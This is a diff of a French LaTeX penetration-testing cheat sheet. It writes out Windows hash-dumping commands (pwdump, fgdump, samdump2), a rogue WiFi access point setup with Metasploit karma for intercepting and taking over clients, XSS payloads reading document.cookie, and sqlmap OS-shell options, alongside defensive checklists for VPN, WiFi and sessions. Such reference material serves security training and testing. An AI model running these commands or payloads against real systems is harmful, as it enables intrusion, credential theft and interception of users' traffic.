+\item Practical malware analysis\\ \url{http://venom630.free.fr/pdf/Practical_Malware_Analysis.pdf}
+\item How to extract streams and shellcodes from a PDF, the easy way\\ \url{http://eternal-todo.com/blog/extract-streams-shellcode-peepdf}
+\end{itemize}
+\vskip+0.2cm
+\textbf{Outils de revers et analyse de malware}
+\begin{itemize}
+\item REMnux : A Linux Distribution for Reverse-Engineering Malware\\ \url{http://zeltser.com/remnux/}
+\item Analyse de comportement de malware\\ \url{http://www.honeynet.org/node/315}
+\item Description des modification effectu\'e par certains malware\\ \url{http://www.malwaretracker.com/pdfthreat.php}
+\item Base de malware\\ \url{http://contagiodump.blogspot.fr}
+\end{itemize}
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{PS Tools}{MS-tech.png}{\url{http://technet.microsoft.com/en-us/sysinternals/bb896649.aspx}}
 {
 \\Boite \`a outils d'exploitation r\'eseau pour les syst\`emes Microsoft (2000, XP, 2003\dots{}).
@@ -6660,27 +6781,24 @@ Les droits administrateurs sont requis.
 }
 {
 \begin{LARGE}Pwdump : \end{LARGE}\\
-
-\textit{Dans le cas d'utilisation pour un syst\`eme 64-bits, il faut utiliser l'option \textbf{-x} avant le nom d'h\^ote.}\vskip +0.2cm
-\textbf{Dumping de la machine locale avec des droits administrateur : }\\{\sl \color{blue}pwdump.exe localhost}\\
-
-\textbf{Dumping d'une machine distante en utilisant un autre compte : }\\{\sl \color{blue}pwdump.exe -u Administrateur -p MotDePasse 192.168.0.1}\\\vskip +0.5cm
+\textit{Dans le cas d'utilisation pour un syst\`eme 64-bits, il faut utiliser l'option \textbf{-x} avant le nom d'h\^ote.}\\
+\textbf{Dumping de la machine locale avec des droits administrateur : }\\{\sl \color{blue}pwdump.exe localhost}\vskip +0.2cm
+\textbf{Dumping d'une machine distante en utilisant un autre compte : }\\{\sl \color{blue}pwdump.exe -u Administrateur -p MotDePasse 192.168.0.1}\\
 
 \begin{LARGE}Fgdump : \end{LARGE}\\
+\textbf{Dumping de la machine locale avec des droits administrateur : }\\{\sl \color{blue}fgdump.exe}\vskip +0.2cm
+\textbf{Dumping en local/\`a distance en utilisant un autre compte : }\\{\sl \color{blue}fgdump.exe -h 127.0.0.1 -u Administrateur -p MotDePasse}\vskip +0.2cm
 
-\textbf{Dumping de la machine locale avec des droits administrateur : }\\{\sl \color{blue}fgdump.exe}\\
-
-\textbf{Dumping en local/\`a distance en utilisant un autre compte : }\\{\sl \color{blue}fgdump.exe -h 127.0.0.1 -u Administrateur -p MotDePasse}\\
-
-\textit{On sp\'ecifie ici pour chacune des machines un compte et mot de passe sous la forme \textbf{host:user:password} ou simplement l'h\^ote dans le cas d'un compte unique.}\vskip +0.2cm
+\textit{On sp\'ecifie ici pour chacune des machines un compte et mot de passe sous la forme \textbf{host:user:password} ou simplement l'h\^ote dans le cas d'un compte unique.}\\
 \textbf{Dumping de plusieurs machines distantes : }\\{\sl \color{blue}fgdump.exe -H fichierMachines.txt}\\ ou\\ {\sl \color{blue}fgdump.exe -f fichierMachines.txt -u Administrateur -p MotDePasse}\vskip +0.2cm
 \textbf{Dumping des donn\'ees prot\'eg\'ees : }\\{\sl \color{blue}fgdump.exe -s}\\
 
-\begin{LARGE}Proc\'edure de r\'ecup\'eration des HASH \`a partir d'une distribution Linux : \end{LARGE}\\
 \addcontentsline{toc}{subsubsection}{Bkhive}
+\begin{LARGE}Proc\'edure de r\'ecup\'eration des HASH \`a partir d'une distribution Linux : \end{LARGE}\\
 \textbf{Exportation de la cl\'e de chiffrement syskey avec bkhive.}\\
-{\sl \color{blue}bkhive /mnt/sda2/windows/system32/config/system syskey}\\
+{\sl \color{blue}bkhive /mnt/sda2/windows/system32/config/system syskey}\vskip +0.2cm
 \addcontentsline{toc}{subsubsection}{Samdump2}
+\textit{Exclusivement pour les syst\`emes Windows XP/2003 et antérieurs.}\\
 \textbf{Utilisation de samdump2 pour cr\'eer un fichier pour john ou Ophcrack pour trouver les mots de passe.}\\
 {\sl \color{blue}samdump2 /mnt/sda2/windows/system32/config/sam syskey.txt}\\
 }
@@ -6699,7 +6817,7 @@ Des interfaces graphiques existent : QemuManager, AQemu, FAUmachine\dots{}
 \textbf{Cr\'eation d'un disque virtuel :}
 \vskip+0.1cm
 \textit{Cr\'eation d'une image de 4Go (GB=go, MB=mo, KB=ko) au format qcow2 (permet les multiples snapshots, chiffrement AES, compression zlib\dots{}) :\\ (formats possibles : cow, qcow, vdi, vmdk, cloop, dmg, boch,s vpc, vvfat, qcow2, raw\dots{})}\\
-{\sl \color{blue}qemu-img create -f qcow2 test.qcow2 4GB}\\
+{\sl \color{blue}qemu-img create -f qcow2 test.qcow2 4GB}\vskip+0.2cm
 
 \textbf{Ex\'ecution d'une image virtuelle :}
 \vskip+0.1cm
@@ -6722,14 +6840,20 @@ qemu -m 512 -hda image.qcow2 -kernel-kqemu\vskip+0.1cm
 {\sl \color{blue}qemu -m 512 -hda test.qcow2 -kernel-kqemu -snapshot}\vskip+0.1cm
 
 \textit{Ex\'ecuter un syst\`eme SPARC :}\\
-{\sl \color{blue}qemu-system-sparc -m 512 -hda sparc.qcow2 -kernel-kqemu}\\
+{\sl \color{blue}qemu-system-sparc -m 512 -hda sparc.qcow2 -kernel-kqemu}\vskip+0.2cm
 
 \textbf{Monter une partition virtuelle (raw) dans un r\'epertoire local :}\\
-{\sl \color{blue}mount -o loop,offset=32256 image.img /mnt/mount\_point}\\
+\textit{L'offset est extrait apr\`es la commande {\sl \color{blue}fdisk -l <fichier>} des lignes:\\
+255 heads, 63 sectors/track, 0 cylinders\\
+Units = cylinders of 16065 * 512 = 8225280 bytes\vskip+0.1cm
+Ou 63 sectors * 512 = 32256.}\\
+{\sl \color{blue}mount -o loop,offset=32256 image.img /mnt/mount\_point} ou\\
+{\sl \color{blue}losetup -o 32256 /dev/loop0 <fichier>}\\
+{\sl \color{blue}mount /dev/loop0 /mnt}\vskip+0.2cm
 
 \textbf{Convertir une partition :}\\
 \textit{Ici qcow2->raw, -O sp\'ecifie le format de destination, -f pour le format du fichier source. Pour le format de sortie : -e pour ajouter du chiffrement, -c pour le compresser, -6 pour la conversion en vmdk v6.}\\
-{\sl \color{blue}qemu-img convert -O raw image.qcow2 image.raw}\\
+{\sl \color{blue}qemu-img convert -O raw image.qcow2 image.raw}\vskip+0.2cm
 
 \textbf{Mode r\'eseau :}
 \vskip+0.1cm
@@ -6738,7 +6862,7 @@ Qemu utilise un serveur DHCP virtuel en 10.0.2.2, DNS en 10.0.2.3, SAMBA en 10.0
 {\sl \color{blue}qemu -m 512 -hda image.qcow2 -kernel-kqemu -net nic -net user}\vskip+0.1cm
 
 \textit{Il est possible d'activer du PAT pour acc\'eder \`a des services de la machine virtuelle \`a partir du r\'eseau\\ (ici ssh:22->2222, le port 2222 est visible sur le r\'eseau physique).}\\
-{\sl \color{blue}qemu -m 512 -hda image.qcow2 -kernel-kqemu -redir tcp:2222::22}\\
+{\sl \color{blue}qemu -m 512 -hda image.qcow2 -kernel-kqemu -redir tcp:2222::22}\vskip+0.2cm
 
 Il est aussi possible d'utiliser les interfaces TAP : \url{http://en.wikibooks.org/wiki/QEMU/Networking}
 }
@@ -6751,7 +6875,7 @@ Il est aussi possible d'utiliser les interfaces TAP : \url{http://en.wikibooks.o
 \url{http://bricowifi.blogspot.com}\\
 }{\\Consiste \`a mettre en place un faux point d'accs WiFi, afin d'intercepter les donnes de utilisateurs, ou prendre le contrle des machines des utilisateurs.}
 {
-\textbf{Identification de l'AP :} {\sl \color{blue}airodump-ng wlan0}\vskip+0.2cm
+\textbf{Identification de l'AP :} {\sl \color{blue}airodump-ng wlan0}\vskip+0.1cm
 
 \textbf{Cr\'eation d'un AP identique :}\\
 \textit{Cr\'eer un lien (mon0) vers le carte r\'eseau en mode monitoring (\'equivalent du promiscious en filaire), pour le d\'esactiver, il faut effectuer la commande airmon-ng stop mon0 :} {\sl \color{blue}airmon-ng start wlan0}\vskip+0.1cm
@@ -6760,14 +6884,14 @@ Il est aussi possible d'utiliser les interfaces TAP : \url{http://en.wikibooks.o
 \textit{Modifier l'adresse MAC de l'interface (peu n\'ecessiter un down/up de l'interface) :}\\
 {\sl \color{blue}macchanger mon0 {-}{-}mac 00:11:22:33:44:55}\vskip+0.1cm
 
-\textit{Cr\'eation de l'AP  (dans certains cas l'AP n'est visible qu'avec l'option -C 30, qui effectue une rotation du num\'ero de channel) :} {\sl \color{blue}airbase-ng -c 1 -e "mon\_AP" -v mon0}\vskip+0.2cm
+\textit{Cr\'eation de l'AP  (dans certains cas l'AP n'est visible qu'avec l'option -C 30, qui effectue une rotation du num\'ero de channel) :} {\sl \color{blue}airbase-ng -c 1 -e "mon\_AP" -v mon0}\vskip+0.15cm
 
 \textbf{Ex\'ecution du service DHCP pour les clients :}\\
 {\sl \color{blue}
 mkdir -p /var/run/dhcpd \&\& chown dhcpd:dhcpd /var/run/dhcpd\\
 mkdir -p /var/run/dhcp3-server \&\& chown dhcpd:dhcpd /var/run/dhcp3-server\\
 dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0
-}\vskip+0.2cm
+}\vskip+0.15cm
 
 \textbf{Redirection de tous les flux des clients vers la machine locale :}\\
 {\sl \color{blue}
@@ -6779,35 +6903,41 @@ iptables -X\\
 iptables -t nat -F\\
 iptables -t nat -X\\
 iptables -A FORWARD -i at0 -j ACCEPT
-}\vskip+0.2cm
+}\vskip+0.15cm
 
 \textbf{Utilisation de Metasploit pour prendre le contr\^ole et l'interception d'information automatique :}\\
 \textit{T\'el\'echarger et modifier karma.rc :} {\sl \color{blue}wget} \url{http://www.offensive-security.com/downloads/karma.rc}\\
 {\sl \color{blue}msfconsole -r karma.rc}\vskip+0.1cm
  
 \textit{Emplacement par d\'efaut de la page html du serveur web metasploit (ici le chemin dans backtrack 4) :}\\
-{\sl \color{blue}/pentest/exploits/framework3/data/exploits/capture/http/index.html}\vskip+0.2cm
+{\sl \color{blue}/pentest/exploits/framework3/data/exploits/capture/http/index.html}\vskip+0.15cm
  
 \textit{Pour afficher les r\'esultats dans metasploit :} {\sl \color{blue}db\_notes}\\
 \textit{Lister les sessions actives meterpreter et utiliser la "1" :}\\
 {\sl \color{blue}sessions}\\
-{\sl \color{blue}sessions -i 1}\vskip+0.2cm
-
+{\sl \color{blue}sessions -i 1}\vskip+0.15cm
 
 \textbf{Capture de flux WiFi :}\\
 \textit{On peut aussi utiliser tcpdump, wireshark ou airodump-ng sur mon0 (BSSID = adresse MAC de la borne WiFi) :}\\
-{\sl \color{blue}airodump-ng {-}{-}write fichier\_resultat {-}{-}channel 8 {-}{-}bssid 00:11:22:33:44:55 mon0}\vskip+0.2cm
+{\sl \color{blue}airodump-ng {-}{-}write fichier\_resultat {-}{-}channel 8 {-}{-}bssid 00:11:22:33:44:55 mon0}\vskip+0.15cm
 
 \textbf{Cartographie de points d'acc\`es :}
+\addcontentsline{toc}{subsubsection}{Ekahau HeatMapper}
 \begin{itemize}
 	\item Kismet : \url{http://www.kismetwireless.net/} \url{http://ilpleut.be/code-kismet} \url{http://www.larsen-b.com/Article/212.html}
 	\item Ekahau HeatMapper (payant) : \url{http://www.ekahau.com/products/heatmapper/overview.html}
 	\item Outils de visualisation du r\'eseau WiFi : \url{http://www.metageek.net/docs/wireless-networking-tools/}
 \end{itemize}
-\vskip+0.2cm
+\vskip+0.15cm
 \textbf{Configurer la carte WiFi du client (sous Linux) :}\\
 \textit{Cr\'eation d'un fichier de configuration : }{\sl \color{blue}wpa\_passphrase ESSID ASCCI\_PASSPHRASE > wpa.conf}\\
 \textit{Connexion : }{\sl \color{blue}wpa\_supplicant -Dwext -iwlan0 wpa.conf}
+\vskip+0.15cm
+\textbf{Extraction de cookie de session et exploitation :}
+\begin{itemize}
+\item Hamster \& Ferret : \url{http://erratasec.blogspot.fr/2009/03/hamster-20-and-ferret-20.html}
+\item Firesheep : \url{http://codebutler.github.com/firesheep/}
+\end{itemize}
 }
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -6817,8 +6947,8 @@ iptables -A FORWARD -i at0 -j ACCEPT
 Nemesis (autre injecteur de paquets) : \url{http://nemesis.sourceforge.net/}
 }
 {
-\\Interpr\'eteur python de manipulation de paquets (cr\'eation de trame, d\'ecodage pour de nombreux protocoles\dots{}). 
-Il n'est pas n\'ecessaire de remplir tous les champs pour effectuer un envoie (valeurs par d\'efaut), r\'esolution DNS automatique, cr\'eation possible de scripts pour automatiser.
+\\Interpr\'eteur python de manipulation de paquets (cr\'eation de trame, d\'ecodage\dots{}).\\
+ Lib graphiques n\'ecessaires : python-gnulot, PythonMagick, python-pyx, python-pygraphviz, python-visual.
 }
 {
 \textbf{Pour lancer l'interpr\'eteur de commande :} {\sl \color{blue} scapy}\\
@@ -6962,7 +7092,7 @@ send(p)}\vskip+0.1cm
 		\item Spider simple / avec dictionnaire :\\
 		Dirbuster : \url{http://sourceforge.net/projects/dirbuster/}\\
 		Burp suite : \url{http://portswigger.net/suite/}\\
-		LUS : \url{http://omni.a.free.fr}\\
+		Wfuzz : \url{http://code.google.com/p/wfuzz/}\\
 		WebScarab : \url{http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project}\\
 		Wikto : \url{http://www.sensepost.com/research/wikto/}
 	\end{itemize}
@@ -7028,13 +7158,14 @@ send(p)}\vskip+0.1cm
 	\item \textbf{\nameref{Nikto}} / \textbf{Wikto} : \url{http://www.sensepost.com/research/wikto/}
 	\item \textbf{PAROS} : \url{http://www.parosproxy.org/index.shtml}
 	\item \textbf{\nameref{SkipFish}}
-	\item \textbf{\nameref{SQLmap}}
+	\item \textbf{\nameref{SQLmap - Commandes}}
 	\item\textbf{Swfintruder} : \url{http://code.google.com/p/swfintruder/}
 	\item \textbf{\nameref{W3af}}
 	\item \textbf{\nameref{WebScarab}}
+	\item \textbf{OWASP Zed Attack Proxy (ZAP)} : \url{http://code.google.com/p/zaproxy/}
 	\item \textbf{D\'ecompileur java/SWF} : \url{http://code.google.com/p/asdec/} \url{http://www.swfmodify.com/}
 	\item \textbf{Base pour injection, XSS\dots{}} : \url{http://code.google.com/p/fuzzdb/}
-	\item Chevaux de Troie : \url{http://www.c99shell.com/}
+	\item \textbf{Chevaux de Troie} : \url{http://www.c99shell.com/}
 \end{itemize}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -7278,26 +7409,12 @@ Le principe est d'injecter du code (javascript) dans des variables qui doivent \
 {
 \small
 \begin{itemize}
-	\item {\sl \color{blue}'';!{-}{-}"\guilsinglleft XSS\guilsinglright=\&\{()\}}
-	\item {\sl \color{blue}\guilsinglleft SCRIPT SRC=http://test/xss.js\guilsinglright\guilsinglleft /SCRIPT\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft A HREF="http://test.fr"\guilsinglright XSS\guilsinglleft/A\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC="javascript:alert('XSS');"\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC=javascript:alert('XSS')\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC=JaVaScRiPt:alert('XSS')\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC=javascript:alert(\&quot;XSS\&quot;)\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC=`javascript:alert("'XSS'")`\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC="jav ascript:alert('XSS');"\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC="jav\&\#x09;ascript:alert('XSS');"\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC="jav\&\#x0A;ascript:alert('XSS');"\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG """\guilsinglright\guilsinglleft SCRIPT\guilsinglright alert("XSS")\guilsinglleft /SCRIPT\guilsinglright"\guilsinglright}
+	\item {\sl \color{blue}alert(document.cookie)}
+	\item {\sl \color{blue}onmouseover="alert(document.cookie)"}
+	\item {\sl \color{blue}\guilsinglleft![CDATA[\guilsinglleft script\guilsinglright alert(document.cookie)\guilsinglleft/script\guilsinglright]]
+\guilsinglright}
+	\item {\sl \color{blue}\guilsinglleft IMG SRC=javascript:alert(document.cookie)\guilsinglright}
 	\item {\sl \color{blue}\guilsinglleft IMG SRC=javascript:alert(String.fromCharCode(88,83,83))\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC=\&\#106;\&\#97;\&\#118;\&\#97;\&\#115;\&\#99;\&\#114;\&\#105;\&\#112;\&\#116;\&\#58;\&\#97;\\
-\&\#108;\&\#101;\&\#114;\&\#116;\&\#40;\&\#39;\&\#88;\&\#83;\&\#83;\&\#39;\&\#41;\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC=\&\#0000106\&\#0000097\&\#0000118\&\#0000097\&\#0000115\&\#0000099\&\#0000114\&\\
-\#0000105\&\#0000112\&\#0000116\&\#0000058\&\#0000097\&\#0000108\&\#0000101\&\#0000114\&\\
-\#0000116\&\#0000040\&\#0000039\&\#0000088\&\#0000083\&\#0000083\&\#0000039\&\#0000041\guilsinglright}
-	\item {\sl \color{blue}\guilsinglleft IMG SRC=\&\#x6A\&\#x61\&\#x76\&\#x61\&\#x73\&\#x63\&\#x72\&\#x69\&\#x70\&\#x74\&\#x3A\&\\
-\#x61\&\#x6C\&\#x65\&\#x72\&\#x74\&\#x28\&\#x27\&\#x58\&\#x53\&\#x53\&\#x27\&\#x29\guilsinglright}
 	\item On peut aussi \'ecrire le code sur plusieurs lignes (voir \textbf{\nameref{S\'ecurit\'e Web - Path Traversal}}) .
 \end{itemize}
 }
@@ -7323,11 +7440,16 @@ Le principe est d'injecter du code (javascript) dans des variables qui doivent \
 \end{itemize}
 
 \vskip+0.2cm
+\textbf{Afficher/Modifier le cookie directement dans le navigateur :}\\
+{\sl \color{blue}
+javascript:alert(document.cookie);\\
+javascript:void(document.cookie="Field=myValue");
+}
+
+\vskip+0.2cm
 \textbf{Se prot\'eger contre les vols de session (cot\'e serveur) :}\\
 {\small
-Toutes les recommandations pr\'ec\'edentes sont valables, 
-ins\'erer dans l'ID de session un hash de propri\'et\'e intrins\`eque au client (adresse ip : REMOTE\_ADDR, l'ent\^ete HTTP : PROXY\_FORWARDED\_FOR)
-qu'il faudra v\'erifier. V\'erifier en permanence les droits de l'utilisateur et utiliser des jetons de session qui expirent. 
+Toutes les recommandations pr\'ec\'edentes sont valables, il est important de limiter le cookie de sesssion \`a une seule machine, un temps restreint et en cas d'action de malveillance d\'etect\'e expirer le cookie.
 }
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -7819,6 +7941,9 @@ Pour plus de documentation voir le r\'epertoire \textbf{doc} de l'installation.
 	\item Activer l'utilisation de Shell SQL en cas de faille: {\sl \color{blue}osShell = \color{red}True{}}
 	\item Utiliser Metasploit, il faut pr\'eciser sont emplacement : {\sl \color{blue}msfPath = \color{red}/pentest/metasploit3{}}\vskip+0.1cm
 \end{itemize}
+\vskip+0.2cm
+\textbf{Attention ! En cas de param\`etres trops longs, il est pr\'ef\'erable d'utiliser un fichier contenant la requ\^ete type :}\\
+{\sl \color{blue}requestFile = \color{red}post.txt}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{SSH}{openssh.png}
@@ -8067,20 +8192,16 @@ La virtualisation r\'eseau fonctionne de 3 mani\`eres diff\'erentes :{\small
 \end{itemize}}
 }
 {
-\textbf{Installer VirtualBox :} {\sl \color{blue}sudo apt-get install virtualbox}\vskip+0.1cm
-
-\textbf{Ex\'ecuter directement une machine virtuelle :} {\sl \color{blue}VBoxSDL -vm numero\_machine\_virtuelle}\vskip+0.1cm
-
+\textbf{Installer VirtualBox :} {\sl \color{blue}sudo apt-get install virtualbox}\\
+\textbf{Ex\'ecuter directement une machine virtuelle :} {\sl \color{blue}VBoxSDL -vm numero\_machine\_virtuelle}\\
 \textbf{Lister les machines avec leurs num\'eros :} {\sl \color{blue}VBoxManage list vms | grep -B1 '\^{}UUID'}\vskip+0.1cm
 
 \textbf{Attacher un fichier ISO comme lecteur virtuel \`a une machine :}\\
-{\sl \color{blue}VBoxManage controlvm numero\_machine\_virtuelle dvdattach fichier.iso}\\
+{\sl \color{blue}VBoxManage controlvm numero\_machine\_virtuelle dvdattach fichier.iso}\vskip+0.2cm
 
 \textit{Il n'est pas recommand\'e (risque de conflit d'UUID) de faire une copie sur la m\^eme machine d'un disque *.vdi, il faut utiliser la commande clonevdi.}\\
-\textbf{Copier une image vdi :} {\sl \color{blue}VBoxManage clonevdi FichierSource.vdi FichierDestination.vdi}\vskip+0.1cm
-
-\textbf{Pour modifier l'UUID d'un disque :} {\sl \color{blue}VBoxManage internalcommands setvdiuuid Fichier.vdi}\vskip+0.1cm
-
+\textbf{Copier une image vdi :} {\sl \color{blue}VBoxManage clonevdi FichierSource.vdi FichierDestination.vdi}\\
+\textbf{Pour modifier l'UUID d'un disque :} {\sl \color{blue}VBoxManage internalcommands setvdiuuid Fichier.vdi}\\
 \textbf{Duplication d'un support directement vers un disque vmdk :}\\ {\sl \color{blue}VBoxManage internalcommands createrawvmdk -filename Fichier.vmdk -rawdisk /dev/sda}\vskip+0.1cm
 
 \textbf{Agrandir un disque vdi :}\\
@@ -8105,22 +8226,23 @@ Afficher le contenu du fichier *.raw :\\
 Copie de la partition du fichier \textbf{MonDisk.raw} vers ma partition \textbf{/dev/sda1} :\\ 
 {\sl \color{blue}sudo dd if=MonDisk.raw of=/dev/sda1 bs=512 skip=208845 count=3453974}\vskip+0.2cm
 
-\textbf{Monter un partage :} {\sl \color{blue}sudo mount -t vboxsf NomDuPartage /mnt/NomDuPartage}\vskip+0.1cm
-
+\textbf{Monter un partage :} {\sl \color{blue}sudo mount -t vboxsf NomDuPartage /mnt/NomDuPartage}\\
 \textbf{Monter une partition d'un fichier vdi comme une partition :}\\
 {\sl \color{blue}vditool dump MonDisk.vdi}\vskip+0.1cm
 
-D\'etecter le d\'ebut de la premi\`ere partition :\\
-\textit{La ligne qui nous int\'eresse : Image:  fFlags=00000000 offStartBlocks=512 offStartData=61944\\
-Les don\'ees utilisateur commencent \`a l'offset 61944.}\\
-{\sl \color{blue}
-losetup -o 61944 /dev/loop0 MonDisk.vdi\\
-fdisk -ul /dev/loop0
-}\vskip+0.1cm
+\textbf{Extraction de la m\'emoire d'une VM :}\\
+{\sl \color{blue}VirtualBox {-}{-}debug {-}{-}startvm <fichier\_VM>}\\
+Puis, dans le menu D\'eboguer->Ligne de commande\dots{}, ex\'ecuter la commande :\\
+{\sl \color{blue}.pgmphystofile <fichier\_de\_sortie>}\vskip+0.2cm
 
-Montage de la partition :\\
-\textit{On r\'ecup\`ere la valeur de d\'ebut (pour l'exemple : 2048).}\\
-{\sl \color{blue}mount -o offset=\$((2048*512)) /dev/loop0 disk/}\vskip+0.2cm
+\textbf{Monter une partition virtuelle (raw) dans un r\'epertoire local :}\\
+\textit{L'offset est extrait apr\`es la commande {\sl \color{blue}fdisk -l <fichier>} des lignes:\\
+255 heads, 63 sectors/track, 0 cylinders\\
+Units = cylinders of 16065 * 512 = 8225280 bytes\vskip+0.1cm
+Ou 63 sectors * 512 = 32256.}\\
+{\sl \color{blue}mount -o loop,offset=32256 image.img /mnt/mount\_point} ou\\
+{\sl \color{blue}losetup -o 32256 /dev/loop0 <fichier>}\\
+{\sl \color{blue}mount /dev/loop0 /mnt}\vskip+0.2cm
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{VPN}{openvpn.png}
@@ -8132,16 +8254,15 @@ Montage de la partition :\\
 \\Un VPN (Virtual Private Network), est un r\'eseau priv\'e virtuel, son objectif est d'interconnecter deux r\'eseaux priv\'e en passant par un r\'eseau public et cela sans que les machines des r\'eseaux priv\'es et publics ne puissent s'\'echanger d'information.
 }
 {
-\underline{Diff\'erentes solutions de VPN :}
+\textbf{Diff\'erentes solutions de VPN :}
 \begin{itemize}
 	\item IPSec (Internet Protocol Security, RFC 2401) :\\ \url{http://www.ietf.org/rfc/rfc2401.txt}, \\{\small\url{http://www.technos-sources.com/tutorial-vpn-ipsec-surcouche-securite-pour-ip-48.aspx}}\vskip +0.2cm
 	\item PPTP (Point-to-point tunneling protocol, RFC 2637) :\\ \url{http://tools.ietf.org/html/rfc2637}\vskip +0.2cm
 	\item SSH (Secure Shell, RFC 4254) :\\ \url{http://tools.ietf.org/html/rfc4254}\\\url{http://www.openssh.com/}\vskip +0.2cm
-	\item SSL/TLS (Transport Layer Security/ex Secure Sockets Layer, RFC 4347) :\\ \url{http://tools.ietf.org/html/rfc4347}\vskip +0.2cm
-	\item \dots{}\\
+	\item SSL/TLS (Transport Layer Security/ex Secure Sockets Layer, RFC 4347) :\\ \url{http://tools.ietf.org/html/rfc4347}
 \end{itemize}
-
-\underline{Points de s\'ecurit\'e pour un VPN :}
+\vskip +0.2cm
+\textbf{Points de s\'ecurit\'e pour un VPN :}
 \begin{description}
 	\item[$\Square$] Une identification et une authentification doivent \^etre faites pour chacun des clients ;
 	\item[$\Square$] Choisir un mot de passe complexe de connexion ;
@@ -8151,8 +8272,32 @@ Montage de la partition :\\
 	\item[$\Square$] En cas d'utilisation d'IP fixes, mettre en place des r\`egles de filtrage en limitant les IP (pare-feu) ;
 	\item[$\Square$] Tous les flux r\'eseaux entrants sur le r\'eseau (r\'eseau priv\'e) doivent \^etre filtr\'es ;
 	\item[$\Square$] Une sonde de d\'etection d'intrusion doit exister apr\`es le firewall du VPN ;
-	\item[$\Square$] Attention \`a la s\'ecurit\'e des postes nomades qui sont des points sensibles pour le r\'eseau ;
+	\item[$\Square$] Attention \`a la s\'ecurit\'e des postes nomades qui sont des points sensibles pour le r\'eseau.
 \end{description}
+\vskip +0.2cm
+\textbf{Test d'un acc\`es VPN :}\\
+\textit{D\'etection des solution de chiffrement pr\'ef\'er\'e.}\\
+{\sl \color{blue}ike-scan <ip>}\vskip+0.2cm
+
+\textit{Identification e la solution de VPN par fingerprinting.}\\
+{\sl \color{blue}ike-scan --showbackoff -v -v <ip>}\vskip+0.2cm
+
+\textit{Identification de la m\'ethode de connexion :\\
+ {-}{-}auth=1  : Pre-shared key authentication.}\\
+\textit{ {-}{-}auth=3  : Certificate based authentication.}\\
+\textit{ {-}{-}auth=64221  : Mode d'authentification hybride, SecureID, Radius, Token\dots{}}\\
+\textit{ {-}{-}auth=1 -A  : Mode agressive possible ?\dots{}}\\
+{\sl \color{blue}ike-scan <ip>  {-}{-}auth=1}\vskip+0.2cm
+
+\textit{Identification de vuln\'erabilit\'e sur le VPN.}\\
+{\sl \color{blue}ikeprobe.exe <ip>}
+\vskip +0.2cm
+\textbf{Outils :}
+\begin{itemize}
+\item Tools : \url{http://www.nta-monitor.com/wiki/index.php/Ike-scan_Comparison_Other_Tools}
+\item IKEcrack : \url{http://sourceforge.net/projects/ikecrack/}\\ \url{http://ikecrack.sourceforge.net/}
+\item IKEProbe : \url{http://www.ernw.de/download/ikeprobe.zip}
+\end{itemize}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \HACKfiche{}{W3af}{w3af.png}
@@ -8402,7 +8547,7 @@ Pour d\'esactiver la prise en compte des fichiers d'exclusions robots.txt (\url{
 \begin{description}
     \item[$\Square$] Le nom du r\'eseau (eSSID) doit \^etre masqu\'e.
     \item[$\Square$] L'eSSID ne doit pas \^etre facilement identifiable.
-    \item[$\Square$] Proscrire les technologies de chiffrement WEP, WPA/WPA2 PSK, WPA/WPA2 WPS, pr\'ef\'erer WPA entreprise.
+    \item[$\Square$] Proscrire les technologies de chiffrement WEP, WPA/WPA2 PSK, WPA/WPA2 WPS, pr\'ef\'erer WPA entreprise avec certificat.
     \item[$\Square$] En cas d'utilisation de cl\'e, celle-ci doit \^etre complexe et difficile \`a identifier.
     \item[$\Square$] Cloisonner les clients (un client WiFi ne doit pas pouvoir contacter un autre client WiFi).
     \item[$\Square$] L'acc\`es au r\'eseau \`a partir du WiFi doit \^etre cloisonn\'e par un proxy ou firewall.
@@ -8423,7 +8568,7 @@ Pour d\'esactiver la prise en compte des fichiers d'exclusions robots.txt (\url{
 \end{description}
 
 \textbf{Remarque :}\\
-Attention, les portails captifs peuvent souvent \^etre contourn\'es en usurpant l'adresse IP et l'adresse MAC d'un utilisateur autoris\'e.
+Attention, les portails captifs peuvent souvent \^etre contourn\'es en usurpant l'adresse IP et l'adresse MAC d'un utilisateur autoris\'e, ou encore par du tunneling DNS.
 }
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -8461,7 +8606,7 @@ Depuis la cr\'eation des syst\`emes d'exploitation graphique de Microsoft la bas
 \item \textbf{Registry decoder} : \url{http://code.google.com/p/registrydecoder/}
 \end{itemize}
 \vskip+0.2cm
-\textbf{Liste des informations dans le registre :}
+\textbf{Liste d'informations disponibles dans le registre (non exaustif) :}
 \begin{itemize}
 	\item programmes et mises \` a jour :\\
